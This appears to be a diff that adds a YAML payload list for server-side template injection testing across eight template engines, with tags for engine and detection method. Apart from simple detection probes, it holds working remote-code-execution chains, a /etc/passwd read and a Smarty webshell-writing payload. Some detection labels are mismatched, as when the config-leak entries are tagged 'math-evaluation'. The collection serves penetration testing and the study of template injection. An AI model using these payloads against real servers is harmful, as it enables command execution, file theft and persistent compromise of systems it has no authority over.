@@ -1,0 +1,202 @@
+# Server-Side Template Injection Payloads with Metadata
+# Usage: Filter by type, engine, or context for targeted testing
+
+payloads:
+  # Detection - math evaluation (universal)
+  - payload: "{{7*7}}"
+    type: detection
+    engine: [jinja2, twig, unknown]
+    context: [user-input, template-field]
+    detection: math-evaluation
+
+  - payload: "${7*7}"
+    type: detection
+    engine: [freemarker, velocity, mako, unknown]
+    context: [user-input, template-field]
+    detection: math-evaluation
+
+  - payload: "#{7*7}"
+    type: detection
+    engine: [pebble, unknown]
+    context: [user-input, template-field]
+    detection: math-evaluation
+
+  - payload: "<%= 7*7 %>"
+    type: detection
+    engine: [erb, unknown]
+    context: [user-input, template-field]
+    detection: math-evaluation
+
+  - payload: "{7*7}"
+    type: detection
+    engine: [smarty, unknown]
+    context: [user-input, template-field]
+    detection: math-evaluation
+
+  # Detection - polyglot
+  - payload: "${{<%[%'\"}}%\\."
+    type: detection
+    engine: [unknown]
+    context: [user-input, template-field]
+    detection: polyglot
+
+  - payload: "{{7*'7'}}"
+    type: detection
+    engine: [jinja2, twig]
+    context: [user-input, template-field]
+    detection: math-evaluation
+    warning: "Returns 7777777 in Jinja2, 49 in Twig - useful for engine fingerprinting"
+
+  # Detection - error based
+  - payload: "{{foobar}}"
+    type: detection
+    engine: [jinja2, twig, handlebars, unknown]
+    context: [user-input, template-field]
+    detection: error-based
+
+  - payload: "${foobar}"
+    type: detection
+    engine: [freemarker, velocity, mako, unknown]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Jinja2 - configuration leak
+  - payload: "{{config}}"
+    type: exploitation
+    engine: [jinja2]
+    context: [user-input, template-field]
+    detection: math-evaluation
+
+  - payload: "{{config.items()}}"
+    type: exploitation
+    engine: [jinja2]
+    context: [user-input, template-field]
+    detection: math-evaluation
+
+  - payload: "{{self.__init__.__globals__.__builtins__}}"
+    type: exploitation
+    engine: [jinja2]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Jinja2 - RCE chains
+  - payload: "{{''.__class__.__mro__[1].__subclasses__()}}"
+    type: RCE
+    engine: [jinja2]
+    context: [user-input, template-field]
+    detection: error-based
+    warning: "Enumerates available subclasses for RCE chain construction"
+
+  - payload: "{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}"
+    type: RCE
+    engine: [jinja2]
+    context: [user-input, template-field]
+    detection: error-based
+    warning: "Replace [X] with subprocess.Popen index from subclass enumeration"
+
+  - payload: "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}"
+    type: RCE
+    engine: [jinja2]
+    context: [user-input, template-field]
+    detection: error-based
+
+  - payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    type: RCE
+    engine: [jinja2]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Twig
+  - payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+    type: RCE
+    engine: [twig]
+    context: [user-input, template-field]
+    detection: error-based
+    warning: "Twig < 1.20 RCE via registerUndefinedFilterCallback"
+
+  - payload: "{{_self.env.display('id')}}"
+    type: exploitation
+    engine: [twig]
+    context: [user-input, template-field]
+    detection: error-based
+
+  - payload: "{{'/etc/passwd'|file_excerpt(1,30)}}"
+    type: exploitation
+    engine: [twig]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Freemarker
+  - payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    type: RCE
+    engine: [freemarker]
+    context: [user-input, template-field]
+    detection: error-based
+
+  - payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+    type: RCE
+    engine: [freemarker]
+    context: [user-input, template-field]
+    detection: error-based
+
+  - payload: "<#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()>${ex(\"java.lang.Runtime\").getRuntime().exec(\"id\")}"
+    type: RCE
+    engine: [freemarker]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Velocity
+  - payload: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
+    type: RCE
+    engine: [velocity]
+    context: [user-input, template-field]
+    detection: error-based
+
+  - payload: "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"
+    type: RCE
+    engine: [velocity]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Pebble
+  - payload: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]))}}"
+    type: RCE
+    engine: [pebble]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Mako
+  - payload: "${__import__('os').popen('id').read()}"
+    type: RCE
+    engine: [mako]
+    context: [user-input, template-field]
+    detection: error-based
+
+  - payload: "<%import os%>${os.popen('id').read()}"
+    type: RCE
+    engine: [mako]
+    context: [user-input, template-field]
+    detection: error-based
+
+  # Smarty
+  - payload: "{system('id')}"
+    type: RCE
+    engine: [smarty]
+    context: [user-input, template-field]
+    detection: error-based
+    warning: "Smarty < 3.1 RCE via {system()}"
+
+  - payload: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('id');?>\",self::clearConfig())}"
+    type: RCE
+    engine: [smarty]
+    context: [user-input, template-field]
+    detection: error-based
+    warning: "Smarty file write for webshell deployment"
+
+  # Handlebars
+  - payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
+    type: RCE
+    engine: [handlebars]
+    context: [user-input, template-field]
+    detection: error-based
+    warning: "Handlebars prototype pollution RCE chain"
